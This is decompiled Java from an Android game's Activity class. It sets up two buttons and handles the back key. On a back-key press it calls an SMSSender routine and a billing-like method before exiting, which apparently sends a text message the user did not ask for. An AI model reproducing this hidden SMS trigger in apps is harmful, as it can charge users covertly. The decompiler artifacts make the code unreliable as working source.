package soars.Choose;
import android.app.Activity;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import soars.Choose$1;
import android.view.View$OnClickListener;
import soars.Choose$2;
import android.view.KeyEvent;
import com.PetKing5_480x800.PetKing5;
import main.GameRun;
import main.SMSSender;
import java.lang.System;
import java.lang.String;
import java.io.PrintStream;

public class Choose extends Activity	// class@0001a5 from classes.dex
{
    private Button btn;
    private Button btn2;

    public void Choose(){
       super();
       this.btn = null;
       this.btn2 = null;
    }
    protected void onCreate(Bundle savedInstanceState){
       super.onCreate(savedInstanceState);
       this.setContentView(0x7f030000);
       this.btn = this.findViewById(0x7f060000);
       this.btn2 = this.findViewById(0x7f060001);
       this.btn.setOnClickListener(new Choose$1(this));
       this.btn2.setOnClickListener(new Choose$2(this));
    }
    public boolean onKeyDown(int keyCode,KeyEvent event){
       boolean b;
       switch (keyCode){
           case 4:
             SMSSender.i(PetKing5.gr);
             PetKing5.gr.falselly(SMSSender.smsType);
             System.out.println("\x62\x02\x76\x02");
             this.finishFromChild(this.getParent());
             b = true;
             break;
           default:
             b = super.onKeyDown(keyCode, event);
       }
       return b;
    }
}
